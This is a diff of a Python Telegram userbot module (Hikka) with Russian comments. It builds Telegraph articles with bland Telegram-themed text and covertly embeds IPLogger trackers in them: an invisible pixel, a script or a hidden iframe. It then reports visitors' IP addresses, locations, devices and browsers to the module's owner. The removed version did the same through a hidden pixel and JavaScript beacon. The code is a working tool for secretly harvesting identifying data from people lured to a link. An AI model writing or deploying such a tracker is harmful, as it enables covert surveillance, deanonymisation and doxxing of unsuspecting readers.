@@ -1,43 +1,61 @@
 # meta developer: @sunshinelzt
 # scope: hikka_only
 # scope: hikka_min 1.3.0
-# requires: telegraph
+# requires: telegraph requests
 
 import logging
 import random
 import string
 import re
 import json
-import base64
 from telethon.tl.types import Message
 from .. import loader, utils
 import aiohttp
 import asyncio
 from datetime import datetime
+import requests
 from telegraph import Telegraph
 from telegraph.exceptions import TelegraphException
-from urllib.parse import quote
+from urllib.parse import quote, urlencode
 
 logger = logging.getLogger(__name__)
 
 @loader.tds
-class TelegraphTrackerMod(loader.Module):
-    """Создает реальные Telegraph статьи с невидимым трекером для получения информации о пользователе"""
+class TelegraphIPLoggerMod(loader.Module):
+    """Создает статьи в Telegraph с трекером IPLogger для сбора информации о посетителях"""
     
     strings = {
-        "name": "TelegraphTracker",
-        "loading": "🔄 <b>Создание статьи в Telegraph...</b>",
-        "tgph_created": "📝 <b>Telegraph статья успешно создана!</b>\n\n<b>Название:</b> <code>{title}</code>\n<b>URL:</b> <code>{url}</code>\n<b>ID трекера:</b> <code>{track_id}</code>",
+        "name": "TelegraphIPLogger",
+        "loading": "🔄 <b>Создание статьи в Telegraph с IPLogger...</b>",
+        "tgph_created": "📝 <b>Telegraph статья успешно создана!</b>\n\n<b>Название:</b> <code>{title}</code>\n<b>URL:</b> <code>{url}</code>\n<b>Статистика:</b> <code>{stats_url}</code>",
         "account_created": "✅ <b>Telegraph аккаунт создан!</b>\n<b>Имя:</b> {name}\n<b>Токен:</b> <code>{token}</code>",
         "error": "❌ <b>Ошибка:</b> {error}",
-        "no_data": "❌ <b>Нет данных о посещениях</b>",
-        "user_info": "✅ <b>Информация о посетителе:</b>\n\n📱 <b>IP-адрес:</b> <code>{ip}</code>\n🌐 <b>User-Agent:</b> <code>{ua}</code>\n🔍 <b>Устройство:</b> <code>{device}</code>\n📍 <b>Локация:</b> <code>{location}</code>\n🌍 <b>Страна:</b> <code>{country}</code>\n🏙 <b>Город:</b> <code>{city}</code>\n📶 <b>Интернет-провайдер:</b> <code>{isp}</code>\n⏱ <b>Время посещения:</b> <code>{time}</code>",
-        "user_visit": "👁 <b>Новое посещение вашей статьи!</b>\n\n📝 <b>Статья:</b> <code>{title}</code>\n📱 <b>IP-адрес:</b> <code>{ip}</code>\n🌐 <b>Устройство:</b> <code>{device}</code>\n🌍 <b>Местоположение:</b> <code>{location}</code>",
-        "stats_title": "📊 <b>Статистика Telegraph статей</b>\n\n",
-        "help_info": "ℹ️ <b>TelegraphTracker - модуль для создания статей в Telegraph с трекером</b>\n\n<b>Команды:</b>\n• <code>.tgph</code> - создать новую статью с трекером\n• <code>.tgphset</code> - настроить Telegraph аккаунт\n• <code>.tgphstats</code> - просмотр статистики статей\n• <code>.tgphinfo [ID]</code> - информация о посетителях\n• <code>.tgphdel [ID]</code> - удалить статью\n\n<b>Настройки:</b>\n• ARTICLE_TITLE - заголовок статьи\n• ARTICLE_TEXT - содержимое статьи\n• AUTHOR_NAME - имя автора\n• TRACKER_URL - URL сервера трекера",
-        "article_deleted": "🗑 <b>Статья с ID</b> <code>{id}</code> <b>удалена</b>",
-        "article_not_found": "❓ <b>Статья с ID</b> <code>{id}</code> <b>не найдена</b>",
-        "article_preview": "📋 <b>Предпросмотр статьи:</b>\n\n<b>Заголовок:</b> {title}\n<b>Автор:</b> {author}\n<b>Текст:</b> {text_preview}...\n\n<b>Для публикации напишите:</b> <code>.tgph publish</code>",
+        "no_iplogger": "⚠️ <b>Для работы необходим API ключ IPLogger.</b>\n\nПолучите ключ на сайте https://iplogger.org и добавьте его через команду:\n<code>.iplogset ваш_ключ</code>",
+        "iplogger_set": "✅ <b>API ключ IPLogger успешно установлен!</b>",
+        "preview_article": "📋 <b>Предпросмотр статьи:</b>\n\n<b>Заголовок:</b> {title}\n<b>Автор:</b> {author}\n<b>Текст:</b> {text_preview}...\n\n<b>Для публикации используйте:</b> <code>.tgph publish</code>",
+        "retrieving_stats": "🔄 <b>Получение статистики IPLogger...</b>",
+        "stats": "📊 <b>Статистика посещений</b>\n\n<b>URL:</b> <code>{url}</code>\n<b>Посещений:</b> {visits}\n<b>Уникальных посетителей:</b> {unique}\n<b>Последнее посещение:</b> {last_visit}\n\n<b>Детальная статистика:</b> <code>{stats_url}</code>",
+        "iplogger_type_help": "⚙️ <b>Доступные типы трекеров IPLogger:</b>\n\n" +
+                             "• <code>image</code> - Невидимое изображение 1x1 пиксель\n" +
+                             "• <code>redirect</code> - Редирект на указанный URL\n" +
+                             "• <code>webroot</code> - Веб-документ с JavaScript трекером\n" +
+                             "• <code>invisible</code> - Полностью невидимый JavaScript трекер\n\n" +
+                             "Используйте: <code>.iplogset type тип_трекера</code>",
+        "iplogger_type_set": "✅ <b>Тип трекера IPLogger установлен:</b> {type}",
+        "help_info": "ℹ️ <b>TelegraphIPLogger - модуль для создания статей Telegraph с трекером IPLogger</b>\n\n" +
+                     "<b>Команды:</b>\n" +
+                     "• <code>.tgph</code> - создать новую статью с трекером\n" +
+                     "• <code>.tgph publish</code> - опубликовать подготовленную статью\n" +
+                     "• <code>.tgphset</code> - настроить Telegraph аккаунт\n" +
+                     "• <code>.iplogset ключ_api</code> - установить API ключ IPLogger\n" +
+                     "• <code>.iplogset type тип_трекера</code> - установить тип трекера\n" +
+                     "• <code>.iplogset redirect url</code> - установить URL для редиректа\n" +
+                     "• <code>.tgphlogs [ID]</code> - получить статистику посещений\n" +
+                     "• <code>.tgphlist</code> - список созданных статей\n\n" +
+                     "<b>Настройки:</b>\n" +
+                     "• ARTICLE_TITLE - заголовок статьи\n" +
+                     "• ARTICLE_TEXT - содержимое статьи\n" +
+                     "• NOTIFY_ON_VISIT - уведомлять о новых посещениях"
     }
     
     def __init__(self):
@@ -45,22 +63,20 @@ class TelegraphTrackerMod(loader.Module):
             "ARTICLE_TITLE", "Интересная информация о Telegram", "Заголовок статьи Telegraph",
             "ARTICLE_TEXT", "Telegram - это мессенджер, который сочетает в себе скорость, безопасность и удобство. Узнайте больше о функциях и возможностях этой платформы.", 
             "Текст для статьи Telegraph (поддерживает HTML-форматирование)",
-            "AUTHOR_NAME", "Telegram Insider", "Имя автора статьи",
-            "NOTIFY_ON_VISIT", True, "Уведомлять о посещениях статьи",
-            "TRACKER_URL", "https://your-tracking-server.com/track", "URL трекинг-сервера",
-            "INVISIBLE_PIXEL", True, "Использовать невидимый пиксель для трекинга",
-            "USE_REAL_TELEGRAPH", True, "Использовать реальный Telegraph API"
+            "AUTHOR_NAME", "Telegram Expert", "Имя автора статьи",
+            "NOTIFY_ON_VISIT", True, "Уведомлять о посещениях статьи"
         )
         
         # Временное хранилище для создаваемой статьи
         self.temp_article = None
         
-        # Хранилище данных о статьях и посетителях
+        # Хранилище данных о статьях
         self.articles = {}
-        self.visitors = {}
         self.telegraph_token = None
         self.telegraph_author = None
-        self.telegraph = None
+        self.iplogger_api_key = None
+        self.iplogger_tracker_type = "image"  # По умолчанию невидимое изображение
+        self.iplogger_redirect_url = None
     
     async def client_ready(self, client, db):
         self.client = client
@@ -68,29 +84,28 @@ class TelegraphTrackerMod(loader.Module):
         
         # Загружаем сохраненные данные
         self.articles = self.db.get(self.__class__.__name__, "articles", {})
-        self.visitors = self.db.get(self.__class__.__name__, "visitors", {})
         self.telegraph_token = self.db.get(self.__class__.__name__, "telegraph_token", None)
         self.telegraph_author = self.db.get(self.__class__.__name__, "telegraph_author", self.config["AUTHOR_NAME"])
-        
-        # Инициализируем Telegraph API если есть токен
-        if self.telegraph_token:
-            self.telegraph = Telegraph(self.telegraph_token)
+        self.iplogger_api_key = self.db.get(self.__class__.__name__, "iplogger_api_key", None)
+        self.iplogger_tracker_type = self.db.get(self.__class__.__name__, "iplogger_tracker_type", "image")
+        self.iplogger_redirect_url = self.db.get(self.__class__.__name__, "iplogger_redirect_url", None)
         
     def _save_data(self):
         """Сохраняет данные в базу"""
         self.db.set(self.__class__.__name__, "articles", self.articles)
-        self.db.set(self.__class__.__name__, "visitors", self.visitors)
         self.db.set(self.__class__.__name__, "telegraph_token", self.telegraph_token)
         self.db.set(self.__class__.__name__, "telegraph_author", self.telegraph_author)
+        self.db.set(self.__class__.__name__, "iplogger_api_key", self.iplogger_api_key)
+        self.db.set(self.__class__.__name__, "iplogger_tracker_type", self.iplogger_tracker_type)
+        self.db.set(self.__class__.__name__, "iplogger_redirect_url", self.iplogger_redirect_url)
         
-    def _generate_random_id(self, length=12):
+    def _generate_random_id(self, length=8):
         """Генерирует случайный ID для статьи"""
         chars = string.ascii_lowercase + string.digits
         return ''.join(random.choice(chars) for _ in range(length))
     
     def _html_to_telegraph_format(self, html_content):
         """Конвертирует HTML в формат, принимаемый Telegraph API"""
-        # Это простая реализация, для реального использования нужен более сложный парсер
         content = []
         
         # Разбиваем текст на абзацы
@@ -103,31 +118,6 @@ class TelegraphTrackerMod(loader.Module):
                 })
                 
         return content
-    
-    def _create_tracker_html(self, track_id):
-        """Создает HTML-код трекера"""
-        if self.config["INVISIBLE_PIXEL"]:
-            # Создаем невидимый пиксель с параметрами трекинга
-            tracker_url = f"{self.config['TRACKER_URL']}?id={track_id}"
-            return f'<img src="{tracker_url}" style="position:absolute;opacity:0;width:1px;height:1px;" />'
-        else:
-            # Альтернативный вариант через JavaScript (для продвинутого трекинга)
-            tracker_js = f"""
-            <script>
-                (function() {{
-                    var img = new Image();
-                    img.src = "{self.config['TRACKER_URL']}?id={track_id}&r=" + Math.random() + 
-                              "&ua=" + encodeURIComponent(navigator.userAgent) + 
-                              "&res=" + screen.width + "x" + screen.height;
-                    img.style.position = "absolute";
-                    img.style.opacity = "0";
-                    img.style.width = "1px";
-                    img.style.height = "1px";
-                    document.body.appendChild(img);
-                }})();
-            </script>
-            """
-            return tracker_js
     
     async def _create_telegraph_account(self, short_name=None, author_name=None):
         """Создает аккаунт в Telegraph"""
@@ -144,7 +134,6 @@ class TelegraphTrackerMod(loader.Module):
                 author_name=author_name
             )
             
-            self.telegraph = telegraph
             self.telegraph_token = account["access_token"]
             self.telegraph_author = author_name
             self._save_data()
@@ -154,39 +143,191 @@ class TelegraphTrackerMod(loader.Module):
             logger.exception(f"Ошибка при создании аккаунта Telegraph: {e}")
             return None
     
-    async def _create_telegraph_page(self, title, content, author_name, track_id):
-        """Создает страницу в Telegraph"""
-        if not self.telegraph:
-            if not self.telegraph_token:
-                account = await self._create_telegraph_account(author_name=author_name)
-                if not account:
-                    return None, "Не удалось создать аккаунт Telegraph"
-            else:
-                self.telegraph = Telegraph(self.telegraph_token)
+    async def _create_iplogger_tracker(self, domain="iplogger.org"):
+        """Создает трекер IPLogger"""
+        if not self.iplogger_api_key:
+            return None, "API ключ IPLogger не установлен"
+        
+        # Определяем тип трекера
+        tracker_type = self.iplogger_tracker_type
+        
+        # Базовый URL для API IPLogger
+        api_url = "https://iplogger.org/logger/new/"
+        
+        # Параметры для создания трекера
+        params = {
+            'key': self.iplogger_api_key,
+            'type': tracker_type,
+            'domain': domain
+        }
+        
+        # Если тип трекера redirect, добавляем URL для перенаправления
+        if tracker_type == "redirect" and self.iplogger_redirect_url:
+            params['redirect'] = self.iplogger_redirect_url
         
         try:
-            # Преобразуем текст статьи в формат Telegraph
-            telegraph_content = self._html_to_telegraph_format(content)
+            async with aiohttp.ClientSession() as session:
+                async with session.post(api_url, data=params) as response:
+                    if response.status == 200:
+                        result = await response.json()
+                        if result.get("status") == "success":
+                            logger_data = result.get("data", {})
+                            return logger_data, None
+                        else:
+                            return None, result.get("error", "Неизвестная ошибка IPLogger")
+                    else:
+                        return None, f"Ошибка запроса к API IPLogger: {response.status}"
+        except Exception as e:
+            logger.exception(f"Ошибка при создании трекера IPLogger: {e}")
+            return None, str(e)
+    
+    async def _get_iplogger_stats(self, iplogger_id):
+        """Получает статистику посещений IPLogger"""
+        if not self.iplogger_api_key:
+            return None, "API ключ IPLogger не установлен"
+        
+        api_url = f"https://iplogger.org/logger/{iplogger_id}/stat/"
+        
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(api_url, params={'key': self.iplogger_api_key}) as response:
+                    if response.status == 200:
+                        result = await response.json()
+                        if result.get("status") == "success":
+                            return result.get("data", {}), None
+                        else:
+                            return None, result.get("error", "Неизвестная ошибка IPLogger")
+                    else:
+                        return None, f"Ошибка запроса к API IPLogger: {response.status}"
+        except Exception as e:
+            logger.exception(f"Ошибка при получении статистики IPLogger: {e}")
+            return None, str(e)
+    
+    async def _create_telegraph_page(self, title, content, author_name, iplogger_tracker):
+        """Создает страницу в Telegraph с трекером IPLogger"""
+        telegraph = None
+        
+        # Инициализируем Telegraph API
+        if self.telegraph_token:
+            telegraph = Telegraph(self.telegraph_token)
+        else:
+            account = await self._create_telegraph_account(author_name=author_name)
+            if account:
+                telegraph = Telegraph(self.telegraph_token)
+            else:
+                return None, "Не удалось создать аккаунт Telegraph"
+        
+        try:
+            # Подготавливаем контент для Telegraph
+            content_html = ""
+            for paragraph in content.split("\n\n"):
+                if paragraph.strip():
+                    content_html += f"<p>{paragraph.strip()}</p>"
             
-            # Добавляем невидимый трекер в конец статьи
-            tracker_html = self._create_tracker_html(track_id)
-            telegraph_content.append({
-                "tag": "div",
-                "children": [tracker_html]
-            })
+            # Добавляем трекер IPLogger в зависимости от типа
+            if self.iplogger_tracker_type == "image":
+                # Невидимое изображение
+                content_html += f'<img src="{iplogger_tracker["tracking_link"]}" style="position:absolute;opacity:0;width:1px;height:1px;" />'
+            elif self.iplogger_tracker_type == "invisible":
+                # Невидимый JavaScript трекер
+                content_html += f'<script src="{iplogger_tracker["tracking_link"]}"></script>'
+            elif self.iplogger_tracker_type == "webroot":
+                # Веб-документ с JavaScript трекером
+                content_html += f'<iframe src="{iplogger_tracker["tracking_link"]}" style="width:1px;height:1px;position:absolute;opacity:0;"></iframe>'
             
-            # Создаем страницу
-            response = self.telegraph.create_page(
+            # Создаем страницу в Telegraph
+            response = telegraph.create_page(
                 title=title,
                 author_name=author_name,
-                html_content=''.join([f"<p>{p['children'][0]}</p>" for p in telegraph_content if p['tag'] == 'p']) + tracker_html
+                html_content=content_html
             )
             
             page_url = f"https://telegra.ph/{response['path']}"
             return page_url, None
+            
         except Exception as e:
             logger.exception(f"Ошибка при создании страницы Telegraph: {e}")
             return None, str(e)
+    
+    @loader.owner
+    async def iplogsetcmd(self, message: Message):
+        """Настроить API ключ и параметры IPLogger"""
+        args = utils.get_args_raw(message)
+        
+        if not args:
+            if not self.iplogger_api_key:
+                await utils.answer(message, self.strings["no_iplogger"])
+            else:
+                key_preview = f"{self.iplogger_api_key[:5]}...{self.iplogger_api_key[-3:]}"
+                await utils.answer(
+                    message, 
+                    f"ℹ️ <b>Текущие настройки IPLogger:</b>\n\n"
+                    f"<b>API ключ:</b> <code>{key_preview}</code>\n"
+                    f"<b>Тип трекера:</b> <code>{self.iplogger_tracker_type}</code>\n"
+                    f"<b>URL редиректа:</b> <code>{self.iplogger_redirect_url or 'Не установлен'}</code>\n\n"
+                    f"<b>Для изменения параметров используйте:</b>\n"
+                    f"• <code>.iplogset ключ_api</code> - установить API ключ\n"
+                    f"• <code>.iplogset type тип_трекера</code> - установить тип трекера\n"
+                    f"• <code>.iplogset redirect url</code> - установить URL для редиректа\n"
+                    f"• <code>.iplogset help</code> - показать информацию о типах трекеров"
+                )
+            return
+        
+        if args == "help":
+            await utils.answer(message, self.strings["iplogger_type_help"])
+            return
+            
+        if args.startswith("type "):
+            # Установка типа трекера
+            tracker_type = args.split("type ")[1].strip()
+            
+            if tracker_type not in ["image", "redirect", "webroot", "invisible"]:
+                return await utils.answer(
+                    message, 
+                    f"❌ <b>Неверный тип трекера:</b> {tracker_type}\n\n"
+                    f"Используйте <code>.iplogset help</code> для просмотра доступных типов."
+                )
+            
+            self.iplogger_tracker_type = tracker_type
+            self._save_data()
+            
+            await utils.answer(
+                message, 
+                self.strings["iplogger_type_set"].format(type=tracker_type)
+            )
+            
+        elif args.startswith("redirect "):
+            # Установка URL для редиректа
+            redirect_url = args.split("redirect ")[1].strip()
+            
+            # Проверяем, что URL корректный
+            if not redirect_url.startswith(("http://", "https://")):
+                redirect_url = f"https://{redirect_url}"
+            
+            self.iplogger_redirect_url = redirect_url
+            self._save_data()
+            
+            await utils.answer(
+                message, 
+                f"✅ <b>URL для редиректа установлен:</b>\n<code>{redirect_url}</code>"
+            )
+            
+        else:
+            # Считаем, что передан API ключ
+            api_key = args.strip()
+            
+            # Простая проверка формата API ключа IPLogger (обычно 32 символа)
+            if len(api_key) < 20:
+                return await utils.answer(
+                    message, 
+                    "❌ <b>Неверный формат API ключа IPLogger.</b>\n\n"
+                    "Получите ключ на сайте https://iplogger.org"
+                )
+            
+            self.iplogger_api_key = api_key
+            self._save_data()
+            
+            await utils.answer(message, self.strings["iplogger_set"])
     
     @loader.owner
     async def tgphsetcmd(self, message: Message):
@@ -223,7 +364,6 @@ class TelegraphTrackerMod(loader.Module):
                 telegraph = Telegraph(token)
                 account_info = telegraph.get_account_info()
                 
-                self.telegraph = telegraph
                 self.telegraph_token = token
                 self.telegraph_author = account_info.get("author_name", self.config["AUTHOR_NAME"])
                 self._save_data()
@@ -242,9 +382,11 @@ class TelegraphTrackerMod(loader.Module):
             self.telegraph_author = author_name
             self._save_data()
             
-            if self.telegraph:
+            # Обновляем имя автора в Telegraph, если есть токен
+            if self.telegraph_token:
                 try:
-                    self.telegraph.edit_account_info(author_name=author_name)
+                    telegraph = Telegraph(self.telegraph_token)
+                    telegraph.edit_account_info(author_name=author_name)
                 except Exception as e:
                     logger.warning(f"Не удалось обновить имя автора в Telegraph: {e}")
             
@@ -252,9 +394,13 @@ class TelegraphTrackerMod(loader.Module):
     
     @loader.owner
     async def tgphcmd(self, message: Message):
-        """Создать статью в Telegraph с трекером"""
+        """Создать статью в Telegraph с трекером IPLogger"""
         args = utils.get_args_raw(message)
         
+        # Проверяем, установлен ли API ключ IPLogger
+        if not self.iplogger_api_key:
+            return await utils.answer(message, self.strings["no_iplogger"])
+            
         if args == "publish" and self.temp_article:
             # Публикуем подготовленную статью
             await utils.answer(message, self.strings["loading"])
@@ -262,20 +408,30 @@ class TelegraphTrackerMod(loader.Module):
             title = self.temp_article["title"]
             content = self.temp_article["content"]
             author = self.temp_article["author"]
-            track_id = self.temp_article["track_id"]
             
-            page_url, error = await self._create_telegraph_page(title, content, author, track_id)
-            
+            # Создаем трекер IPLogger
+            iplogger_tracker, error = await self._create_iplogger_tracker()
             if error:
                 return await utils.answer(message, self.strings["error"].format(error=error))
-                
+            
+            # Создаем страницу в Telegraph с трекером
+            page_url, error = await self._create_telegraph_page(title, content, author, iplogger_tracker)
+            if error:
+                return await utils.answer(message, self.strings["error"].format(error=error))
+            
+            # Получаем данные о трекере
+            iplogger_id = iplogger_tracker.get("id")
+            stats_url = iplogger_tracker.get("stat_link")
+            
             # Сохраняем информацию о статье
-            self.articles[track_id] = {
+            article_id = self._generate_random_id()
+            self.articles[article_id] = {
                 "title": title,
                 "url": page_url,
                 "author": author,
-                "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                "visits": 0
+                "iplogger_id": iplogger_id,
+                "stats_url": stats_url,
+                "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             }
             self._save_data()
             
@@ -287,7 +443,7 @@ class TelegraphTrackerMod(loader.Module):
                 self.strings["tgph_created"].format(
                     title=title,
                     url=page_url,
-                    track_id=track_id
+                    stats_url=stats_url
                 )
             )
             return
@@ -296,21 +452,19 @@ class TelegraphTrackerMod(loader.Module):
         title = self.config["ARTICLE_TITLE"]
         content = self.config["ARTICLE_TEXT"]
         author = self.telegraph_author or self.config["AUTHOR_NAME"]
-        track_id = self._generate_random_id()
         
         # Сохраняем во временное хранилище
         self.temp_article = {
             "title": title,
             "content": content,
-            "author": author,
-            "track_id": track_id
+            "author": author
         }
         
         # Показываем предпросмотр статьи
         text_preview = content[:100].replace("\n", " ")
         await utils.answer(
             message,
-            self.strings["article_preview"].format(
+            self.strings["preview_article"].format(
                 title=title,
                 author=author,
                 text_preview=text_preview
@@ -318,216 +472,101 @@ class TelegraphTrackerMod(loader.Module):
         )
     
     @loader.owner
-    async def tgphstatscmd(self, message: Message):
-        """Показать статистику по созданным статьям"""
+    async def tgphlogscmd(self, message: Message):
+        """Получить статистику посещений IPLogger"""
+        args = utils.get_args_raw(message)
+        
+        # Проверяем, установлен ли API ключ IPLogger
+        if not self.iplogger_api_key:
+            return await utils.answer(message, self.strings["no_iplogger"])
+        
+        if not args:
+            # Если ID не указан, берем последнюю созданную статью
+            if not self.articles:
+                return await utils.answer(message, "❌ <b>У вас нет созданных статей с трекером.</b>")
+            
+            article_id = list(self.articles.keys())[-1]
+            iplogger_id = self.articles[article_id]["iplogger_id"]
+        else:
+            # Проверяем, есть ли статья с указанным ID
+            if args not in self.articles:
+                # Возможно, был передан непосредственно ID трекера IPLogger
+                iplogger_id = args
+            else:
+                article_id = args
+                iplogger_id = self.articles[article_id]["iplogger_id"]
+        
+        await utils.answer(message, self.strings["retrieving_stats"])
+        
+        # Получаем статистику
+        stats, error = await self._get_iplogger_stats(iplogger_id)
+        if error:
+            return await utils.answer(message, self.strings["error"].format(error=error))
+        
+        # Формируем ответ со статистикой
+        article = None
+        for a_id, a_data in self.articles.items():
+            if a_data["iplogger_id"] == iplogger_id:
+                article = a_data
+                break
+        
+        title = article["title"] if article else "Неизвестная статья"
+        url = article["url"] if article else "Неизвестно"
+        stats_url = article["stats_url"] if article else stats.get("stat_link", "")
+        
+        visits = stats.get("visits", 0)
+        unique = stats.get("unique", 0)
+        last_visit = stats.get("last_visit", "Нет посещений")
+        
+        response = f"📊 <b>Статистика посещений статьи</b>\n\n"
+        response += f"<b>Название:</b> {title}\n"
+        response += f"<b>URL:</b> <code>{url}</code>\n"
+        response += f"<b>Посещений:</b> {visits}\n"
+        response += f"<b>Уникальных посетителей:</b> {unique}\n"
+        
+        if last_visit and last_visit != "Нет посещений":
+            response += f"<b>Последнее посещение:</b> {last_visit}\n"
+        
+        # Если есть данные о последних посетителях
+        if "logs" in stats and stats["logs"]:
+            response += "\n<b>Последние посещения:</b>\n"
+            
+            for i, log in enumerate(stats["logs"][:5], 1):
+                ip = log.get("ip", "Скрыто")
+                country = log.get("country", "Неизвестно")
+                city = log.get("city", "")
+                device = log.get("device", {}).get("name", "Неизвестно")
+                browser = log.get("browser", {}).get("name", "")
+                time = log.get("time", "")
+                
+                location = f"{country}, {city}" if city else country
+                browser_info = f"{browser}" if browser else ""
+                
+                response += f"{i}. IP: <code>{ip}</code> | {location} | {device} {browser_info} | {time}\n"
+        
+        response += f"\n<b>Полная статистика:</b> <code>{stats_url}</code>"
+        
+        await utils.answer(message, response)
+    
+    @loader.owner
+    async def tgphlistcmd(self, message: Message):
+        """Показать список созданных статей с трекером"""
         if not self.articles:
-            return await utils.answer(message, self.strings["no_data"])
+            return await utils.answer(message, "❌ <b>У вас нет созданных статей с трекером.</b>")
         
-        response = self.strings["stats_title"]
+        response = f"📋 <b>Созданные статьи ({len(self.articles)}):</b>\n\n"
         
-        for idx, (track_id, article) in enumerate(sorted(self.articles.items(), key=lambda x: x[1]["created"], reverse=True), 1):
-            visits = len(self.visitors.get(track_id, []))
+        for idx, (article_id, article) in enumerate(sorted(self.articles.items(), key=lambda x: x[1]["created"], reverse=True), 1):
             response += f"{idx}. <b>{article['title']}</b>\n"
-            response += f"   👁 <code>{visits}</code> посещений | ID: <code>{track_id}</code>\n"
+            response += f"   🆔 <code>{article_id}</code>\n"
             response += f"   🔗 <code>{article['url']}</code>\n"
+            response += f"   📊 <code>{article['stats_url']}</code>\n"
             response += f"   📅 Создана: {article['created']}\n\n"
         
-        response += "\nИспользуйте <code>.tgphinfo [ID]</code> для подробной информации о посетителях."
+        response += "Используйте <code>.tgphlogs [ID]</code> для просмотра статистики."
         await utils.answer(message, response)
-    
-    @loader.owner
-    async def tgphinfocmd(self, message: Message):
-        """Показать информацию о посетителях статьи"""
-        args = utils.get_args_raw(message)
-        
-        if not args:
-            return await utils.answer(
-                message, 
-                "⚠️ <b>Укажите ID статьи</b>\n\nПример: <code>.tgphinfo abc123</code>"
-            )
-        
-        if args not in self.visitors or not self.visitors[args]:
-            return await utils.answer(message, self.strings["no_data"])
-        
-        article = self.articles.get(args, {"title": "Неизвестная статья"})
-        visitors_data = self.visitors[args]
-        
-        response = f"📊 <b>Информация о посещениях статьи</b>\n\n"
-        response += f"📝 <b>Название:</b> {article['title']}\n"
-        response += f"👁 <b>Всего посещений:</b> {len(visitors_data)}\n\n"
-        
-        # Выводим последние 10 посещений
-        for i, visitor in enumerate(visitors_data[-10:], 1):
-            response += f"<b>Посещение #{i}</b>\n"
-            response += f"📱 IP: <code>{visitor.get('ip', 'неизвестно')}</code>\n"
-            response += f"🌐 Устройство: <code>{visitor.get('device', 'неизвестно')}</code>\n"
-            response += f"📍 Локация: <code>{visitor.get('location', 'неизвестно')}</code>\n"
-            response += f"⏱ Время: <code>{visitor.get('time', 'неизвестно')}</code>\n\n"
-        
-        await utils.answer(message, response)
-    
-    @loader.owner
-    async def tgphdelcmd(self, message: Message):
-        """Удалить статью по ID"""
-        args = utils.get_args_raw(message)
-        
-        if not args:
-            return await utils.answer(
-                message, 
-                "⚠️ <b>Укажите ID статьи для удаления</b>\n\nПример: <code>.tgphdel abc123</code>"
-            )
-        
-        if args not in self.articles:
-            return await utils.answer(
-                message, 
-                self.strings["article_not_found"].format(id=args)
-            )
-        
-        # Удаляем статью из Telegraph если возможно
-        if self.telegraph:
-            try:
-                # Извлекаем path из URL
-                path = self.articles[args]["url"].split("telegra.ph/")[1]
-                self.telegraph.delete_page(path)
-            except Exception as e:
-                logger.warning(f"Не удалось удалить статью из Telegraph: {e}")
-        
-        # Удаляем данные из локального хранилища
-        del self.articles[args]
-        if args in self.visitors:
-            del self.visitors[args]
-        
-        self._save_data()
-        
-        await utils.answer(
-            message, 
-            self.strings["article_deleted"].format(id=args)
-        )
     
     @loader.owner
     async def tgphhelpcmd(self, message: Message):
         """Показать помощь по модулю"""
         await utils.answer(message, self.strings["help_info"])
-    
-    async def process_tracker_data(self, track_id, data):
-        """
-        Обрабатывает данные от трекера
-        
-        Этот метод должен вызываться вашим трекинг-сервером через API или другим способом
-        """
-        if track_id not in self.articles:
-            return
-        
-        # Сохраняем информацию о посетителе
-        visitor_info = {
-            "ip": data.get("ip", "неизвестно"),
-            "user_agent": data.get("user_agent", "неизвестно"),
-            "device": self._detect_device(data.get("user_agent", "")),
-            "location": data.get("location", "неизвестно"),
-            "country": data.get("country", "неизвестно"),
-            "city": data.get("city", "неизвестно"),
-            "isp": data.get("isp", "неизвестно"),
-            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        }
-        
-        if track_id not in self.visitors:
-            self.visitors[track_id] = []
-        
-        self.visitors[track_id].append(visitor_info)
-        self._save_data()
-        
-        # Отправляем уведомление, если включено
-        if self.config["NOTIFY_ON_VISIT"]:
-            article = self.articles[track_id]
-            await self.client.send_message(
-                "me",  # Отправляем сообщение себе в избранное
-                self.strings["user_visit"].format(
-                    title=article["title"],
-                    ip=visitor_info["ip"],
-                    device=visitor_info["device"],
-                    location=visitor_info["location"]
-                )
-            )
-    
-    def _detect_device(self, user_agent):
-        """Определяет устройство по User-Agent"""
-        if not user_agent:
-            return "Неизвестно"
-        
-        if "iPhone" in user_agent:
-            match = re.search(r"iPhone\s*OS\s*(\d+)", user_agent)
-            ios_version = match.group(1) if match else ""
-            return f"iPhone (iOS {ios_version})" if ios_version else "iPhone"
-        
-        if "iPad" in user_agent:
-            return "iPad"
-            
-        if "Android" in user_agent:
-            match = re.search(r"Android\s+(\d+)", user_agent)
-            android_version = match.group(1) if match else ""
-            
-            if "Mobile" in user_agent:
-                device_type = "смартфон"
-            else:
-                device_type = "планшет"
-                
-            return f"Android {android_version} ({device_type})" if android_version else f"Android ({device_type})"
-        
-        if "Windows" in user_agent:
-            match = re.search(r"Windows NT\s+(\d+\.\d+)", user_agent)
-            win_version = match.group(1) if match else ""
-            
-            versions = {
-                "10.0": "Windows 10",
-                "6.3": "Windows 8.1",
-                "6.2": "Windows 8",
-                "6.1": "Windows 7",
-                "6.0": "Windows Vista",
-                "5.2": "Windows XP x64",
-                "5.1": "Windows XP",
-            }
-            
-            return versions.get(win_version, f"Windows ({win_version})") if win_version else "Windows"
-        
-        if "Macintosh" in user_agent:
-            match = re.search(r"Mac OS X\s+(\d+[._]\d+)", user_agent)
-            mac_version = match.group(1).replace("_", ".") if match else ""
-            return f"macOS {mac_version}" if mac_version else "macOS"
-        
-        if "Linux" in user_agent and "Android" not in user_agent:
-            return "Linux"
-            
-        if "BlackBerry" in user_agent or "BB10" in user_agent:
-            return "BlackBerry"
-            
-        if "Kindle" in user_agent:
-            return "Kindle"
-            
-        if "PlayStation" in user_agent:
-            return "PlayStation"
-            
-        if "Xbox" in user_agent:
-            return "Xbox"
-            
-        if "Nintendo" in user_agent:
-            return "Nintendo Switch"
-        
-        # Определение браузера
-        browsers = [
-            ("Chrome", r"Chrome/(\d+)"),
-            ("Firefox", r"Firefox/(\d+)"),
-            ("Safari", r"Safari/(\d+)"),
-            ("Edge", r"Edge/(\d+)"),
-            ("Opera", r"Opera/(\d+)"),
-            ("Yandex", r"YaBrowser/(\d+)"),
-            ("MSIE", r"MSIE\s+(\d+)"),
-            ("UCBrowser", r"UCBrowser/(\d+)")
-        ]
-        
-        for browser_name, pattern in browsers:
-            match = re.search(pattern, user_agent)
-            if match:
-                version = match.group(1)
-                return f"Браузер {browser_name} {version}"
-        
-        return "Неизвестное устройство"
